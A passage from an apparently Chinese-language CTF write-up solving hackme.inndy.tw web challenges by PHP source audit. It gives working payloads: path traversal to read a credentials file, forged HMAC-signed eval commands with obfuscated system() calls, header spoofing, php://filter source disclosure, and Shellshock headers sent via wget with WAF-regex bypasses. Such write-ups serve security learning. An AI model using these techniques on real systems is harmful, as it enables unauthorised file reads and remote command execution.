header(<span class="string">'Content-Disposition: attachment; filename="'</span> . $item . <span class="string">'"'</span>);</span><br><span class="line">        header(<span class="string">'Cache-Control: no-cache, must-revalidate'</span>);</span><br><span class="line">        header(<span class="string">'Pragma: no-cache'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @readfile($abs_item);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目过滤部分如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">01</span>) != <span class="number">01</span>) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!get_is_file($dir, $item)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"fileexist"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!get_show_item($dir, $item)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br><span class="line">    $abs_item = get_abs_item($dir, $item);</span><br><span class="line">    <span class="keyword">if</span> (!file_in_web($abs_item) || stristr($abs_item, <span class="string">'.php'</span>) || stristr($abs_item, <span class="string">'config'</span>)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br></pre></td></tr></table></figure><p>我们要读取的是 <code>.config/.htusers.php</code> ，但是在题目的 <code>stristr($abs_item, &#39;.php&#39;) || stristr($abs_item, &#39;config&#39;)</code> 过滤了config和php两个字段，显然无法读取，只得在看看其他的函数，在fun_edit.php中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">edit_file</span><span class="params">($dir, $item)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">01</span>) != <span class="number">01</span>) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!get_is_file($dir, $item)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"fileexist"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!get_show_item($dir, $item)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br><span class="line">    $fname = get_abs_item($dir, $item);</span><br><span class="line">    <span class="keyword">if</span> (!file_in_web($fname)) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($GLOBALS[<span class="string">'__POST'</span>][<span class="string">"dosave"</span>]) &amp;&amp; $GLOBALS[<span class="string">'__POST'</span>][<span class="string">"dosave"</span>] == <span class="string">"yes"</span>) &#123;</span><br><span class="line">        $item = basename(stripslashes($GLOBALS[<span class="string">'__POST'</span>][<span class="string">"fname"</span>]));</span><br><span class="line">        $fname2 = get_abs_item($dir, $item);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($item) || $item == <span class="string">""</span>) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"miscnoname"</span>]);</span><br><span class="line">        <span class="keyword">if</span> ($fname != $fname2 &amp;&amp; @file_exists($fname2)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"itemdoesexist"</span>]);</span><br><span class="line">        savefile($dir, $fname2);</span><br><span class="line">        $fname = $fname2;</span><br><span class="line">    &#125;</span><br><span class="line">    $fp = @fopen($fname, <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> ($fp === <span class="keyword">false</span>) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"openfile"</span>]);</span><br><span class="line">    $s_item = get_rel_item($dir, $item);</span><br><span class="line">    <span class="keyword">if</span> (strlen($s_item) &gt; <span class="number">50</span>) $s_item = <span class="string">"..."</span> . substr($s_item, <span class="number">-47</span>);</span><br><span class="line">    show_header($GLOBALS[<span class="string">"messages"</span>][<span class="string">"actedit"</span>] . <span class="string">": /"</span> . $s_item);</span><br></pre></td></tr></table></figure><p>函数中有三条过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">01</span>) != <span class="number">01</span>) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line"><span class="keyword">if</span> (!get_is_file($dir, $item)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"fileexist"</span>]);</span><br><span class="line"><span class="keyword">if</span> (!get_show_item($dir, $item)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br></pre></td></tr></table></figure><p>第一条权限验证guest权限显然是满足的，第二条判断文件是否存在，不需要考虑，第三个我们跟进函数看一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_show_item</span><span class="params">($dir, $item)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($item == <span class="string">"."</span> || $item == <span class="string">".."</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">'help'</span>] == <span class="string">'me'</span>) &#123;</span><br><span class="line">        $_COOKIE[<span class="string">'help'</span>] = <span class="keyword">null</span>;</span><br><span class="line">        setcookie(<span class="string">'help'</span>, <span class="string">''</span>, time() - <span class="number">9999999999</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("Very good. You know how to create cookie. How about tamper a cookie?")&lt;/script&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($_COOKIE[<span class="string">'show_hidden'</span>])) &#123;</span><br><span class="line">        setcookie(<span class="string">'show_hidden'</span>, <span class="string">'no'</span>, time() + <span class="number">3600</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (substr($item, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">"."</span> &amp;&amp; $GLOBALS[<span class="string">"show_hidden"</span>] == <span class="keyword">false</span> &amp;&amp; $_COOKIE[<span class="string">'show_hidden'</span>] != <span class="string">'yes'</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span> ($GLOBALS[<span class="string">"no_access"</span>] != <span class="string">""</span> &amp;&amp; @eregi($GLOBALS[<span class="string">"no_access"</span>], $item)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span> ($GLOBALS[<span class="string">"show_hidden"</span>] == <span class="keyword">false</span>) &#123;</span><br><span class="line">        $dirs = explode(<span class="string">"/"</span>, $dir);</span><br><span class="line">        <span class="keyword">foreach</span> ($dirs <span class="keyword">as</span> $i) <span class="keyword">if</span> (substr($i, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">"."</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目仅仅对$item进行了简单的过滤， <code>if ($item == &quot;.&quot; || $item == &quot;..&quot;) return false;</code> ，那么我们可以考虑用目录穿越 <code>../../</code> 绕过</p><p>那么至此我们可以在网站中找到edit相关的函数，发起请求（注意cookie中show_hidden对应的值要改为yes）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;dafuq-manager.hackme.inndy.tw&#x2F;index.php?action&#x3D;edit&amp;item&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;webhdisk&#x2F;.config&#x2F;.htusers.php&amp;order&#x3D;name&amp;srt&#x3D;yes&amp;lang&#x3D;en</span><br></pre></td></tr></table></figure><p>于是可以读到目标文件</p><p><img src="/2020/09/13/hackme-1/3.png" alt=".htusers.php"></p><p>然后用admin用户登录即可，注意密码要进行md5解密即可，密码为 <code>how do you turn this on</code> ，登录即可读取flag</p><h1 id="dafuq-manager-3"><a href="#dafuq-manager-3" class="headerlink" title="dafuq-manager 3"></a>dafuq-manager 3</h1><p>题目给出了信息</p><blockquote><p>For flag3, you need a shell to get that. see $WEBROOT/flag3!</p></blockquote><p>这关我们需要getsheel读取文件，那么我们在源码中寻找可以执行系统命令的语句，在文件中尝试搜索关键词 <code>eval</code> ，在fun_debug.php中发现存在该函数，跟进一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">do_debug</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    assert(strlen($GLOBALS[<span class="string">'secret_key'</span>]) &gt; <span class="number">40</span>);</span><br><span class="line">    $dir = $GLOBALS[<span class="string">'__GET'</span>][<span class="string">'dir'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strcmp($dir, <span class="string">"magically"</span>) || strcmp($dir, <span class="string">"hacker"</span>) || strcmp($dir, <span class="string">"admin"</span>)) &#123;</span><br><span class="line">        show_error(<span class="string">'You are not hacky enough :('</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">list</span>($cmd, $hmac) = explode(<span class="string">'.'</span>, $GLOBALS[<span class="string">'__GET'</span>][<span class="string">'command'</span>], <span class="number">2</span>);</span><br><span class="line">    $cmd = base64_decode($cmd);</span><br><span class="line">    $bad_things = <span class="keyword">array</span>(<span class="string">'system'</span>, <span class="string">'exec'</span>, <span class="string">'popen'</span>, <span class="string">'pcntl_exec'</span>, <span class="string">'proc_open'</span>, <span class="string">'passthru'</span>, <span class="string">'`'</span>, <span class="string">'eval'</span>, <span class="string">'assert'</span>, <span class="string">'preg_replace'</span>, <span class="string">'create_function'</span>, <span class="string">'include'</span>, <span class="string">'require'</span>, <span class="string">'curl'</span>,);</span><br><span class="line">    <span class="keyword">foreach</span> ($bad_things <span class="keyword">as</span> $bad) &#123;</span><br><span class="line">        <span class="keyword">if</span> (stristr($cmd, $bad)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'2bad'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (hash_equals(hash_hmac(<span class="string">'sha256'</span>, $cmd, $GLOBALS[<span class="string">"secret_key"</span>]), $hmac)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="keyword">eval</span>($cmd));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        show_error(<span class="string">'What does the fox say?'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于dir的过滤，我们可以利用strcmp的数组绕过特性来绕过，题目还过滤了一些系统函数，我们可以考虑通过base64编码绕过，而对于$GLOBALS[‘__GET’][‘command’]变量的生成，题目也给出了生成函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_command</span><span class="params">($cmd)</span> </span>&#123;</span><br><span class="line">    $hmac = hash_hmac(<span class="string">'sha256'</span>, $cmd, $GLOBALS[<span class="string">"secret_key"</span>]);</span><br><span class="line">    <span class="keyword">return</span> sprintf(<span class="string">'%s.%s'</span>, base64_encode($cmd), $hmac);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以我们可以自己生成command</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_command</span><span class="params">($cmd)</span> </span>&#123;</span><br><span class="line">    $hmac = hash_hmac(<span class="string">'sha256'</span>, $cmd, <span class="string">"KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3"</span>);</span><br><span class="line">    <span class="keyword">return</span> sprintf(<span class="string">'%s.%s'</span>, base64_encode($cmd), $hmac);</span><br><span class="line">&#125;</span><br><span class="line">var_dump(make_command(<span class="string">'$a=\'sys\';$b=\'tem\';$c=$a.$b;$c(base64_decode(\'Li9mbGFnMy9tZW93IGZsYWczL2ZsYWcz\'));'</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注意本题不能直接读取flag，要通过运行目录下的一个c文件来间接读取flag，最终payload如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;dafuq-manager.hackme.inndy.tw&#x2F;index.php?action&#x3D;debug&amp;dir[]&#x3D;admin&amp;command&#x3D;JGE9J3N5cyc7JGI9J3RlbSc7JGM9JGEuJGI7JGMoYmFzZTY0X2RlY29kZSgnTGk5bWJHRm5NeTl0Wlc5M0lHWnNZV2N6TDJac1lXY3onKSk7.001e9b2112bdf0443a0eaf4a489f477d1cf525cf58f05286606007046856460b&amp;order&#x3D;name&amp;srt&#x3D;yes&amp;lang&#x3D;en</span><br></pre></td></tr></table></figure><p>做完后感觉自己好菜呀，这代码审计的我晕头转向，233333…</p><h1 id="wordpress-1"><a href="#wordpress-1" class="headerlink" title="wordpress 1"></a>wordpress 1</h1><p>WordPress代码审计，在backup file中可以下载到源码，打开源码，随便翻一下，在 <code>wp-content/plugins/core.php</code> 中发现了一段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">print_f14g</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$h = <span class="string">'m'</span>.sprintf(<span class="string">'%s%d'</span>,<span class="string">'d'</span>,<span class="number">-4</span>+<span class="number">9e0</span>);</span><br><span class="line"><span class="keyword">if</span>($h($_GET[<span class="string">'passw0rd'</span>]) === <span class="string">'5ada11fd9c69c78ea65c832dd7f9bbde'</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(wp_get_user_ip() === <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line"><span class="keyword">eval</span>(mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $h($_GET[<span class="string">'passw0rd'</span>].AUTH_KEY), base64_decode(<span class="string">'zEFnGVANrtEUTMLVyBusu4pqpHjqhn3X+cCtepGKg89VgIi6KugA+hITeeKIpnQIQM8UZbUkRpuCe/d8Rf5HFQJSawpeHoUg5NtcGam0eeTw+1bnFPT3dcPNB8IekPBDyXTyV44s3yaYMUAXZWthWHEVDFfKSjfTpPmQkB8fp6Go/qytRtiP3LyYmofhOOOV8APh0Pv34VPjCtxcJUpqIw=='</span>), MCRYPT_MODE_CBC, $h($_GET[<span class="string">'passw0rd'</span>].AUTH_SALT)));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Sorry, Only admin from localhost can get flag'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们把代码中的md5解密一下发现是 <code>cat flag</code>，而题目要求从本地访问，我们可以通过修改x-forwarded-for字段实现，所以修改请求头之后，在访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;wp.hackme.inndy.tw&#x2F;?passw0rd&#x3D;cat%20flag</span><br></pre></td></tr></table></figure><p>查看元素即可找到flag</p><h1 id="wordpress-2"><a href="#wordpress-2" class="headerlink" title="wordpress 2"></a>wordpress 2</h1><p>随便翻一下博客上的文章，发现有2013年10月发表了一篇文章，题目为flag2，但是需要密码，审计代码发现在content-search.php中有如下语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- debug:<span class="meta">&lt;?php</span> var_dump($wp_query-&gt;post-&gt;&#123;<span class="string">'post_'</span>.(string)($_GET[<span class="string">'debug'</span>]?:<span class="string">'type'</span>)&#125;); <span class="meta">?&gt;</span> --&gt;</span><br></pre></td></tr></table></figure><p>看到query，应该是在搜索页面，所以我们提交的payload应该为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;wp.hackme.inndy.tw&#x2F;archives&#x2F;date&#x2F;2013&#x2F;10?s&#x3D;&amp;debug&#x3D;content</span><br></pre></td></tr></table></figure><h1 id="command-executor"><a href="#command-executor" class="headerlink" title="command-executor"></a>command-executor</h1><p>随便点击，发现有func参数存在文件读取漏洞，利用filter协议可以读取文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;command-executor.hackme.inndy.tw&#x2F;index.php?func&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index</span><br></pre></td></tr></table></figure><p>base64解码一下得到源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pages = [</span><br><span class="line">    [<span class="string">'man'</span>, <span class="string">'Man'</span>],</span><br><span class="line">    [<span class="string">'untar'</span>, <span class="string">'Tar Tester'</span>],</span><br><span class="line">    [<span class="string">'cmd'</span>, <span class="string">'Cmd Exec'</span>],</span><br><span class="line">    [<span class="string">'ls'</span>, <span class="string">'List files'</span>],</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fuck</span><span class="params">($msg)</span> </span>&#123;</span><br><span class="line">    header(<span class="string">'Content-Type: text/plain'</span>);</span><br><span class="line">    <span class="keyword">echo</span> $msg;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$black_list = [</span><br><span class="line">    <span class="string">'\/flag'</span>, <span class="string">'\(\)\s*\&#123;\s*:;\s*\&#125;;'</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $black_list;</span><br><span class="line">    <span class="keyword">if</span>(is_array($a)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($a <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">            waf($key);</span><br><span class="line">            waf($val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($black_list <span class="keyword">as</span> $b) &#123;</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">"/$b/"</span>, $a) === <span class="number">1</span>) &#123;</span><br><span class="line">                fuck(<span class="string">"$b detected! exit now."</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">waf($_SERVER);</span><br><span class="line">waf($_GET);</span><br><span class="line">waf($_POST);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">($cmd, $shell=<span class="string">'bash'</span>)</span> </span>&#123;</span><br><span class="line">    system(sprintf(<span class="string">'%s -c %s'</span>, $shell, escapeshellarg($cmd)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_SERVER <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">    <span class="keyword">if</span>(substr($key, <span class="number">0</span>, <span class="number">5</span>) === <span class="string">'HTTP_'</span>) &#123;</span><br><span class="line">        putenv(<span class="string">"$key=$val"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$page = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'func'</span>])) &#123;</span><br><span class="line">    $page = $_GET[<span class="string">'func'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr($page, <span class="string">'..'</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        $page = <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($page &amp;&amp; strlen($page) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">"$page.php"</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>题目有一个putenv()敏感函数，百度可知存在一个2014年的一个重大漏洞 <code>CVE-2014-6271(破壳（shellsock）漏洞)</code> ，在freebuf中有一个链接</p><blockquote><p><a href="http://www.freebuf.com/articles/system/45390.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/system/45390.html</a></p></blockquote><p>国外有一个漏洞利用的文章，</p><blockquote><p><a href="https://security.stackexchange.com/questions/68325/shellshock-attack-scenario-exploiting-php" target="_blank" rel="noopener">https://security.stackexchange.com/questions/68325/shellshock-attack-scenario-exploiting-php</a></p></blockquote><p><img src="/2020/09/13/hackme-1/4.png" alt="exp"></p><p>但是直接利用会被waf掉，所以我们要考虑绕过正则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;\(\)\s*\&#123;\s*:;\s*\&#125;;&#39;</span><br></pre></td></tr></table></figure><p>题目的正则中 <code>:;</code> 是存在漏洞的，我们可以用 <code>: ;</code> 绕过，重试一下发现可以成功，我们可以开始执行shell命令，尝试访问flag，一波探测之后发现读取flag时遇到了又遇到了waf，这次是 <code>\/flag</code> 我们可以利用通配符绕过，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --header&#x3D;&quot;X-Exploit: () &#123; : ; &#125;; &#x2F;bin&#x2F;cat ..&#x2F;..&#x2F;..&#x2F;?lag-reader.c&quot; -q -O -  &quot;https:&#x2F;&#x2F;command-executor.hackme.inndy.tw&#x2F;index.php?func&#x3D;cmd&amp;cmd&#x3D;env&quot;</span><br></pre></td></tr></table></figure><p>但是并没有出现flag，发现是因为只有root才有文件的读权限</p><p><img src="/2020/09/13/hackme-1/5.png" alt></p><p>但是题目中有一个flag-reader文件，我们尝试读取一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --header&#x3D;&quot;X-Exploit: () &#123; : ; &#125;; &#x2F;bin&#x2F;cat ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;?lag-reader.c&quot; -q -O - &quot;https:&#x2F;&#x2F;command-executor.hackme.inndy.tw&#x2F;index.php?func&#x3D;cmd&amp;cmd&#x3D;env&quot;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">include &lt;unistd.h&gt;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buff[<span class="number">4096</span>], rnd[<span class="number">16</span>], val[<span class="number">16</span>];</span><br><span class="line"><span class="keyword">if</span>(syscall(SYS_getrandom, &amp;rnd, <span class="keyword">sizeof</span>(rnd), <span class="number">0</span>) != <span class="keyword">sizeof</span>(rnd)) &#123;</span><br><span class="line"><span class="built_in">write</span>(<span class="number">1</span>, <span class="string">"Not enough random\n"</span>, <span class="number">18</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setuid(<span class="number">1337</span>);</span><br><span class="line">seteuid(<span class="number">1337</span>);</span><br><span class="line">alarm(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">write</span>(<span class="number">1</span>, &amp;rnd, <span class="keyword">sizeof</span>(rnd));</span><br><span class="line"><span class="built_in">read</span>(<span class="number">0</span>, &amp;val, <span class="keyword">sizeof</span>(val));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(rnd, val, <span class="keyword">sizeof</span>(rnd)) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">int</span> fd = <span class="built_in">open</span>(argv[<span class="number">1</span>], 